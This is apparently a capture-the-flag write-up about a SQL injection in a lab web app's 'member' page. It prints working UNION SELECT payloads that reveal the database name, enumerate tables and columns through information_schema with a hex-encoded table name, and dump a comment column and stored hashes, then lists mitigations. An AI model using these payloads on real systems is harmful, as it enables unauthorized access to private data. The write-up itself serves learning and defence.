Exploit: SQL Injection – Members
=================================

Description
-----------
This vulnerability is very similar to the one found in the `searchimg` page.
Refer to the `6_SQL_Injection_searchimg/Resources/README` for a detailed
explanation of SQL Injection attacks.

Scenario
--------
On the members page, the application provides a feature to view member details
using an `id` parameter. By manipulating this parameter, it is possible to
perform SQL Injection attacks similar to those described in the `searchimg`
exploit.

Following the same methodology, single-value SQL functions were injected to
gather information about the database:

```
http://192.168.1.43/?page=member&id=0%20UNION%20SELECT%201,%20database()&Submit=Submit
```

This revealed the database name: Member_Sql_Injection

Enumerating tables
------------------
The database schema was enumerated using `information_schema.tables`, filtered
to the current database:
    id=0 UNION SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET 0)&Submit=Submit

This led to the discovery of the table:

    users

Enumerating columns
-------------------
We tried again to enumerate the columns of the `users` table using `information_schema.columns`:
    id=0 UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 0)&Submit=Submit

Again, this did _not_ work, likely due to the quotes around the table name causing issues.
Using the hexadecimal representation of the table name allowed successful enumeration:

    id=0 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 0x7573657273 LIMIT 1)&Submit=Submit

This led to the discovery of the columns:
- id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

The `Commentaire` column appears to stand out from the rest, suggesting it may contain interesting information:

    id=0 UNION SELECT 1,(SELECT GROUP_CONCAT(Commentaire) FROM users LIMIT 1)&Submit=Submit

This revealed some things about a flag. Enumerating the rest, we can see a user called `GetThe` and `Flag`, with the `countersign` containing a hash.

Following the instructions from the `Commentaire`, we get the flag.

Possible solutions
------------------
- Use prepared statements (parameterised queries)
- Validate and sanitise all user inputs
- Restrict database permissions to the minimum required
- Disable detailed SQL error messages in production

Sources
-------
- https://owasp.org/www-community/attacks/SQL_Injection